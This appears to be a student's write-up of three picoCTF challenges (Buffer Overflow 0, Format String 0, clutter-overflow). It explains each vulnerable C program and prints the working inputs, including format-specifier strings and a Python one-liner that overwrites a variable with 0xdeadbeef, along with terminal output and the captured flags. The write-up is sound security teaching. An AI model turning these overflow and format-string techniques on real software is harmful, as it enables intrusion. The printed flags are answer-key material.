# 1. Buffer Overflow 0

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.

Additional details will be available after launching your challenge instance.

## Solution:

- I analysed the C file given, and realised that we get the flag through the "sigsegv_handler" function.

- I also realised that the input that we are giving is getting copied into the buf2 string, which has a size of 16, so I tried overflow it with an input that is larger than 16.

- On doing this, we directly get the flag.

```
aditya@aaditya-laptop:~$ nc saturn.picoctf.net 58945
Input: 11111111111111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:

- I learnt how to do buffer overflow and what it is.


## Notes:

- Nil.

## Resources:

- Nil.


***


# 2. Format String 0

Can you use your knowledge of format strings to make the customers happy? Download the binary here. Download the source here. Connect with the challenge instance here: nc mimas.picoctf.net 55645

## Solution:

- First, i analysed the C file given, and found that for the first order, our input needs to exceed 64 bytes(2*bufsize-which is defined as 32), so to achievie this, we must use the Gr%114d_Cheese option.
- I was abled to figure it out since we are told to look for format specifiers in the hint, and %114d in "Gr%114d_Cheese" is a format specifier, which when used in a print statement will print out a number which is 114 charecters long, which will satisfy the condition.

- For the second order, I used the "Cla%sic_Che%s%steak" option, since it is the only one with a format specifier, that is "%s" which will try to process a string argument when it doesn't have any, which should break the program, and gives us the flag.


```
aaditya@aaditya-laptop:~$ nc mimas.picoctf.net 55645
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese                                            
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Concepts learnt:

- I learnt how to exploit a vunlnerability in format specifiers.
- I also learned how to analyse programs given.


## Notes:

- Nil.

## Resources:

- Nil.


***

# 3. clutter-overflow

Clutter, clutter everywhere and not a byte to use. nc mars.picoctf.net 31890

## Solution:

- First, i analysed the C file given, and found that we basically need to get the code variable to be "deadbeef". To do this, we can exploit buffer overflow on the variable after this, that is clutter, which is what we are asked to input.

- Using buffer overflow on clutter will basically put the extra part of the input in code.

- We can see that variabel size given is 256, so we use hit and trial to find out that the max is 264, after this, the buffer will overflow, using which we can write deadbeef in code.

- I used the command `(python -c "print('A'*264)+'\xef\xbe\xad\xde'") | nc mars.picoctf.net 31890` to enter deadbeef into code. Since, the hex byte represents two charecters and the bytes are read in reverse order.
  
- This gives us the flag by making code and clutter have the same value.

  

```
aaditya@aaditya-laptop:~$ (python -c "print('A'*264)+'\xef\xbe\xad\xde'") | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

- I learnt what buffer overflow is, and that `gets()` is vulnerable to it.
- I learnt how to exploit buffer overflow

## Notes:

- Nil.

## Resources:

- Nil.


***
